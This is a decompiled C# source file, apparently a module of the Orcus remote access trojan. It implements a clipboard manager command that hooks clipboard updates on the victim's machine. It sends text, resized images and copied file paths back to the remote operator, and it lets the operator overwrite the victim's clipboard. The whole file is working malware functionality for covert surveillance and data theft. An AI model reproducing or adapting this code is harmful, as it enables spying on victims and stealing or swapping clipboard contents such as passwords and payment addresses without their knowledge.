using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Orcus.Extensions;
using Orcus.Plugins;
using Orcus.Shared.Commands.ClipboardManager;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities;

namespace Orcus.Commands.ClipboardManager;

public class ClipboardManagerCommand : Command
{
	private const int BitmapHeight = 200;

	private IConnectionInfo _connectionInfo;

	private readonly Orcus.Utilities.Lazy<Serializer> _clipboardSerializer = new Orcus.Utilities.Lazy<Serializer>(() => new Serializer((IEnumerable<Type>)new Type[4]
	{
		typeof(ClipboardInfo),
		typeof(StringClipboardData),
		typeof(StringListClipboardData),
		typeof(ImageClipboardData)
	}));

	public override void Dispose()
	{
		((Command)this).Dispose();
		ClipboardNotification.ClipboardUpdate -= ClipboardNotificationOnClipboardUpdate;
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected I4, but got Unknown
		ClipboardManagerCommunication val = (ClipboardManagerCommunication)parameter[0];
		if ((int)val != 0)
		{
			switch (val - 3)
			{
			case 0:
				_connectionInfo = connectionInfo;
				ClipboardNotification.ClipboardUpdate += ClipboardNotificationOnClipboardUpdate;
				break;
			case 2:
				ClipboardNotification.ClipboardUpdate -= ClipboardNotificationOnClipboardUpdate;
				break;
			default:
				throw new ArgumentOutOfRangeException();
			case 4:
			{
				ClipboardData clipboardData = _clipboardSerializer.Value.Deserialize<ClipboardData>(parameter, 1);
				Thread thread = new Thread((ThreadStart)delegate
				{
					//IL_0000: Unknown result type (might be due to invalid IL or missing references)
					//IL_0006: Expected O, but got Unknown
					//IL_0048: Unknown result type (might be due to invalid IL or missing references)
					//IL_004d: Unknown result type (might be due to invalid IL or missing references)
					IDataObject val2 = (IDataObject)new DataObject();
					if (!SetDataObjectData(clipboardData, val2))
					{
						ClipboardData obj = clipboardData;
						ImageClipboardData val3 = (ImageClipboardData)(object)((obj is ImageClipboardData) ? obj : null);
						if (val3 != null)
						{
							using (MemoryStream memoryStream = new MemoryStream(val3.get_BitmapData()))
							{
								Image val4 = Image.FromStream((Stream)memoryStream);
								try
								{
									ClipboardFormat clipboardFormat = clipboardData.get_ClipboardFormat();
									val2.SetData(((object)(ClipboardFormat)(ref clipboardFormat)).ToString(), false, (object)val4);
									Clipboard.SetDataObject((object)val2, true);
									return;
								}
								finally
								{
									((IDisposable)val4)?.Dispose();
								}
							}
						}
					}
					Clipboard.SetDataObject((object)val2, true);
					((Command)this).ResponseByte((byte)8, connectionInfo);
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				break;
			}
			}
			return;
		}
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			IDataObject dataObject = Clipboard.GetDataObject();
			if (dataObject == null)
			{
				((Command)this).ResponseByte((byte)2, connectionInfo);
			}
			else
			{
				SendClipboardUpdate(ClipboardNotification.GetClipboardFormat(dataObject), dataObject, connectionInfo);
			}
		});
		thread2.SetApartmentState(ApartmentState.STA);
		thread2.Start();
	}

	private bool SetDataObjectData(ClipboardData clipboardData, IDataObject dataObject)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		StringListClipboardData val = (StringListClipboardData)(object)((clipboardData is StringListClipboardData) ? clipboardData : null);
		ClipboardFormat clipboardFormat;
		if (val != null)
		{
			clipboardFormat = clipboardData.get_ClipboardFormat();
			dataObject.SetData(((object)(ClipboardFormat)(ref clipboardFormat)).ToString(), false, (object)(from x in val.get_StringList()
				select x.get_Value()).ToArray());
			return true;
		}
		StringClipboardData val2 = (StringClipboardData)(object)((clipboardData is StringClipboardData) ? clipboardData : null);
		if (val2 != null)
		{
			clipboardFormat = clipboardData.get_ClipboardFormat();
			dataObject.SetData(((object)(ClipboardFormat)(ref clipboardFormat)).ToString(), false, (object)val2.get_Text());
			return true;
		}
		return false;
	}

	private void ClipboardNotificationOnClipboardUpdate(ClipboardFormat? format, IDataObject data)
	{
		SendClipboardUpdate(format, data, _connectionInfo);
	}

	private void SendClipboardUpdate(ClipboardFormat? format, IDataObject data, IConnectionInfo connectionInfo)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_0138: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Expected O, but got Unknown
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Expected O, but got Unknown
		//IL_01dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ec: Expected O, but got Unknown
		ClipboardInfo val = new ClipboardInfo();
		val.set_Timestamp(DateTime.UtcNow);
		ClipboardInfo val2 = val;
		object obj2;
		if (data.GetDataPresent(DataFormats.Bitmap, true))
		{
			object data2 = data.GetData(DataFormats.Bitmap);
			Image val3 = (Image)((data2 is Image) ? data2 : null);
			try
			{
				if (val3 != null)
				{
					using MemoryStream memoryStream = new MemoryStream();
					if (val3.get_Height() > 200)
					{
						Bitmap val4 = val3.ResizeImage((int)((float)val3.get_Width() / (float)val3.get_Height() * 200f), 200);
						try
						{
							((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						}
						finally
						{
							((IDisposable)val4)?.Dispose();
						}
					}
					else
					{
						val3.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					}
					val2.set_Data((ClipboardData)new ImageClipboardData(memoryStream.ToArray(), val3.get_Width(), val3.get_Height(), (ClipboardFormat)(((int?)format) ?? 3)));
				}
				else
				{
					val2.set_Data((ClipboardData)new ImageClipboardData((byte[])null, 0, 0, (ClipboardFormat)(((int?)format) ?? 3)));
				}
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		else if (data.GetDataPresent(DataFormats.Text, true))
		{
			val2.set_Data((ClipboardData)new StringClipboardData(data.GetData(DataFormats.Text, true) as string, (ClipboardFormat)(((int?)format) ?? 0)));
		}
		else
		{
			if (data.GetDataPresent(DataFormats.FileDrop, true))
			{
				string[] obj = data.GetData(DataFormats.FileDrop) as string[];
				if (obj == null)
				{
					obj2 = null;
				}
				else
				{
					obj2 = ((IEnumerable<string>)obj).Select((Func<string, StringListEntry>)delegate(string x)
					{
						//IL_0000: Unknown result type (might be due to invalid IL or missing references)
						//IL_0005: Unknown result type (might be due to invalid IL or missing references)
						//IL_000d: Expected O, but got Unknown
						StringListEntry val5 = new StringListEntry();
						val5.set_Value(x);
						return val5;
					}).ToList();
					if (obj2 != null)
					{
						goto IL_01a4;
					}
				}
				obj2 = new List<StringListEntry>();
				goto IL_01a4;
			}
			val2.set_Data(new ClipboardData((ClipboardFormat)(((int?)format) ?? 255)));
		}
		goto IL_01ec;
		IL_01ec:
		((Command)this).ResponseBytes((byte)1, _clipboardSerializer.Value.Serialize((object)val2), connectionInfo);
		return;
		IL_01a4:
		val2.set_Data((ClipboardData)new StringListClipboardData((List<StringListEntry>)obj2, (ClipboardFormat)(((int?)format) ?? 14)));
		goto IL_01ec;
	}

	protected override uint GetId()
	{
		return 35u;
	}
}
